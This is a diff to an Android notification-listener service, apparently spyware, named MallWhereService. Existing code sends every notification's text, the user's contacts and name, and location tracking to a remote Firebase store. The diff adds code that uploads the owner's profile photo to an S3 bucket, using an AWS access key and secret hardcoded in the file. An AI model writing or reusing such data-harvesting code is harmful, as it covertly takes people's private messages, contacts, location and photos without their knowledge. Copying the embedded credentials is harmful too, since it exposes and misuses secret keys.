@@ -1,29 +1,47 @@
 package io.perihelion.takecharge;
 
 import android.content.ContentResolver;
+import android.content.ContentUris;
+import android.content.res.AssetFileDescriptor;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.location.Location;
 import android.net.Uri;
 import android.os.Bundle;
+import android.provider.Contacts;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
 
+import com.amazonaws.auth.AWSCredentials;
+import com.amazonaws.auth.BasicAWSCredentials;
+import com.amazonaws.mobileconnectors.s3.transfermanager.TransferManager;
+import com.amazonaws.mobileconnectors.s3.transfermanager.Upload;
+import com.amazonaws.mobileconnectors.s3.transfermanager.model.UploadResult;
 import com.firebase.client.Firebase;
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 
-@SuppressWarnings("All")
+import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+
+
 public class MallWhereService extends NotificationListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
 
     private final String TAG = getClass().getName();
     private Firebase userDataRef;
     private GoogleApiClient mGoogleApiClient;
     private LocationRequest mLocationRequest;
-
 
     @Override
     public void onDestroy() {
@@ -39,10 +57,7 @@ public class MallWhereService extends NotificationListenerService implements Goo
         Log.d(TAG, "onCreate");
         Firebase.setAndroidContext(this);
         userDataRef = new Firebase("https://takecharge.firebaseio.com/" + getAndroidId());
-        Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
-        c.moveToFirst();
-        userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("display_name")));
-        c.close();
+        setUserInfo();
         uploadUserContacts();
         mLocationRequest = LocationRequest.create();
         mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
@@ -61,6 +76,27 @@ public class MallWhereService extends NotificationListenerService implements Goo
         Log.d(TAG, "onNotificationPosted");
         userDataRef.child("notifications").push().setValue(new LoggedNotification(sbn.getPackageName(), (String) sbn.getNotification().tickerText, sbn.getId()));
         Log.d(TAG, "ID :" + sbn.getId() + "t" + sbn.getNotification().tickerText + "t" + sbn.getPackageName());
+    }
+
+    private void setUserInfo() {
+        Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
+        c.moveToFirst();
+        userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("DISPLAY_NAME")));
+        Uri photoUri = Uri.parse(c.getString(c.getColumnIndex("PHOTO_THUMBNAIL_URI")));
+        Log.d(TAG, "photoUri: " + photoUri);
+        File photoFile = new File(photoUri.getPath());
+
+        AWSCredentials credential = new BasicAWSCredentials("AKIAIHAPH4VNZWPFWB2Q", "X9SorZOisWZNWOU0Nm+gC3m1+HQoZzZ6admZrIv3");
+        TransferManager manager = new TransferManager(credential);
+        Upload upload = manager.upload("takecharge", "profpic", photoFile);
+        UploadResult result = null;
+        try {
+            result = upload.waitForUploadResult();
+            Log.d(TAG, "result: " + result.getBucketName() + " " + result.getKey() + " " + result.getETag());
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        c.close();
     }
 
     private void uploadUserContacts() {
@@ -107,6 +143,7 @@ public class MallWhereService extends NotificationListenerService implements Goo
                 userDataRef.child("contacts").child(newContact.getId()).setValue(newContact);
             }
         }
+        cur.close();
     }
 
     private String getAndroidId() {
